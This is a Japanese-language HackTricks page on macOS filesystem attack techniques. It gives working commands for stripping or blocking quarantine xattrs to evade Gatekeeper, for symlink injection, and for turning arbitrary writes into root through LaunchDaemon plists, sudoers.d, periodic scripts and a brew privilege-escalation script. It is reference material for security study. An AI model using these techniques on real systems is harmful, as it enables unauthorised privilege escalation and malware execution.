# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX 権限の組み合わせ

**ディレクトリ**の権限:

- **読み取り** - ディレクトリエントリを**列挙**できます
- **書き込み** - ディレクトリ内の**ファイル**を**削除/書き込み**でき、**空のフォルダ**を**削除**できます。
- しかし、**書き込み権限**がない限り、**非空のフォルダ**を削除/変更することはできません。
- フォルダの名前を**変更**することは、そのフォルダを所有していない限りできません。
- **実行** - ディレクトリを**横断**することが許可されています - この権利がないと、その中のファイルやサブディレクトリにアクセスできません。

### 危険な組み合わせ

**rootが所有するファイル/フォルダを上書きする方法**ですが:

- パス内の親**ディレクトリの所有者**がユーザーである
- パス内の親**ディレクトリの所有者**が**書き込みアクセス**を持つ**ユーザーグループ**である
- ユーザーの**グループ**が**ファイル**に**書き込み**アクセスを持つ

前述のいずれかの組み合わせを使用すると、攻撃者は**特権のある任意の書き込み**を取得するために、期待されるパスに**シンボリック/ハードリンク**を**注入**することができます。

### フォルダのルート R+X 特殊ケース

**ディレクトリ**内に**rootのみがR+Xアクセス**を持つファイルがある場合、それらは**他の誰にもアクセスできません**。したがって、**制限**のためにユーザーが読み取れない**ファイルを**このフォルダから**別のフォルダに移動**できる脆弱性は、これらのファイルを読み取るために悪用される可能性があります。

例: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## シンボリックリンク / ハードリンク

特権プロセスが**低特権ユーザー**によって**制御される**可能性のある**ファイル**にデータを書き込んでいる場合、または低特権ユーザーによって**以前に作成された**可能性がある場合、そのユーザーはシンボリックまたはハードリンクを介して**別のファイルを指す**ことができます。そして、特権プロセスはそのファイルに書き込みます。

攻撃者が**特権を昇格させるために任意の書き込みを悪用できる**他のセクションを確認してください。

## .fileloc

**`.fileloc`**拡張子のファイルは、他のアプリケーションやバイナリを指すことができるため、開くとアプリケーション/バイナリが実行されます。\
例:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 任意FD

**プロセスが高い権限でファイルやフォルダを開くことができる**場合、**`crontab`**を悪用して**`EDITOR=exploit.py`**で`/etc/sudoers.d`内のファイルを開くことができ、`exploit.py`は`/etc/sudoers`内のファイルへのFDを取得し、それを悪用します。

例えば: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## 検疫xattrsトリックを避ける

### 削除する
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable フラグ

ファイル/フォルダにこの不変属性がある場合、xattrを設定することはできません。
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs マウント

**devfs** マウントは **xattr** をサポートしていません。詳細は [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) を参照してください。
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

このACLは、ファイルに`xattrs`を追加することを防ぎます。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble**ファイル形式は、ファイルとそのACEをコピーします。

[**ソースコード**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)を見ると、xattrの中に保存されているACLのテキスト表現である**`com.apple.acl.text`**が、解凍されたファイルのACLとして設定されることがわかります。したがって、ACLが他のxattrsの書き込みを防ぐように設定されたアプリケーションを**AppleDouble**ファイル形式のzipファイルに圧縮した場合... クアランティンxattrはアプリケーションに設定されませんでした。

詳細については、[**元の報告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)を確認してください。

これを再現するには、まず正しいacl文字列を取得する必要があります：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

本当に必要ではありませんが、念のためここに残しておきます：

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## コード署名のバイパス

バンドルには、**`_CodeSignature/CodeResources`** というファイルが含まれており、これは **バンドル** 内のすべての **ファイル** の **ハッシュ** を含んでいます。CodeResources のハッシュは **実行可能ファイル** にも **埋め込まれている** ため、それをいじることはできません。

しかし、署名がチェックされないファイルもいくつかあり、これらは plist に omit キーを持っています。
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
CLIからリソースの署名を計算することができます:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## DMGをマウントする

ユーザーは、既存のフォルダーの上に作成されたカスタムDMGをマウントできます。これが、カスタムコンテンツを含むカスタムDMGパッケージを作成する方法です：
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
通常、macOSは`com.apple.DiskArbitrarion.diskarbitrariond` Machサービス（`/usr/libexec/diskarbitrationd`によって提供される）と通信してディスクをマウントします。LaunchDaemons plistファイルに`-d`パラメータを追加して再起動すると、`/var/log/diskarbitrationd.log`にログを保存します。\
ただし、`hdik`や`hdiutil`のようなツールを使用して、`com.apple.driver.DiskImages` kextと直接通信することも可能です。

## 任意の書き込み

### 定期的なshスクリプト

あなたのスクリプトが**シェルスクリプト**として解釈される場合、毎日トリガーされる**`/etc/periodic/daily/999.local`**シェルスクリプトを上書きすることができます。

このスクリプトの実行を**偽装**することができます：**`sudo periodic daily`**

### デーモン

任意の**LaunchDaemon**を作成します。例えば、**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**のように、任意のスクリプトを実行するplistを作成します。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
`/Applications/Scripts/privesc.sh`を生成し、**root**として実行したい**コマンド**を記述します。

### Sudoersファイル

**任意の書き込み**が可能であれば、**`/etc/sudoers.d/`**フォルダ内にファイルを作成し、**sudo**権限を自分に付与することができます。

### PATHファイル

**`/etc/paths`**ファイルは、PATH環境変数を設定する主な場所の一つです。これを上書きするにはrootである必要がありますが、**特権プロセス**から実行されるスクリプトが**フルパスなしでコマンドを実行**している場合、このファイルを変更することで**ハイジャック**できるかもしれません。

また、**`/etc/paths.d`**にファイルを書き込むことで、`PATH`環境変数に新しいフォルダを追加することもできます。

## 他のユーザーとして書き込み可能なファイルを生成

これは、私が書き込み可能なrootに属するファイルを生成します（[**ここからのコード**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)）。これも特権昇格として機能するかもしれません。
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX共有メモリ

**POSIX共有メモリ**は、POSIX準拠のオペレーティングシステムにおいてプロセスが共通のメモリ領域にアクセスできるようにし、他のプロセス間通信方法と比較してより迅速な通信を促進します。これには、`shm_open()`を使用して共有メモリオブジェクトを作成または開き、`ftruncate()`でそのサイズを設定し、`mmap()`を使用してプロセスのアドレス空間にマッピングすることが含まれます。プロセスはこのメモリ領域から直接読み書きできます。並行アクセスを管理し、データの破損を防ぐために、ミューテックスやセマフォなどの同期メカニズムがよく使用されます。最後に、プロセスは`munmap()`と`close()`で共有メモリをアンマップおよび閉じ、オプションで`shm_unlink()`でメモリオブジェクトを削除します。このシステムは、複数のプロセスが迅速に共有データにアクセスする必要がある環境で、効率的で迅速なIPCに特に効果的です。

<details>

<summary>プロデューサーコード例</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>消費者コードの例</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS ガード付きディスクリプタ

**macOS ガード付きディスクリプタ**は、ユーザーアプリケーションにおける**ファイルディスクリプタ操作**の安全性と信頼性を向上させるためにmacOSで導入されたセキュリティ機能です。これらのガード付きディスクリプタは、ファイルディスクリプタに特定の制限や「ガード」を関連付ける方法を提供し、カーネルによって強制されます。

この機能は、**不正なファイルアクセス**や**レースコンディション**などの特定のクラスのセキュリティ脆弱性を防ぐのに特に役立ちます。これらの脆弱性は、例えばスレッドがファイルディスクリプタにアクセスしているときに**別の脆弱なスレッドがそれにアクセスできる**場合や、ファイルディスクリプタが**脆弱な子プロセスに継承される**場合に発生します。この機能に関連するいくつかの関数は次のとおりです：

- `guarded_open_np`: ガード付きでFDをオープン
- `guarded_close_np`: 閉じる
- `change_fdguard_np`: ディスクリプタのガードフラグを変更（ガード保護を削除することも可能）

## 参考文献

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
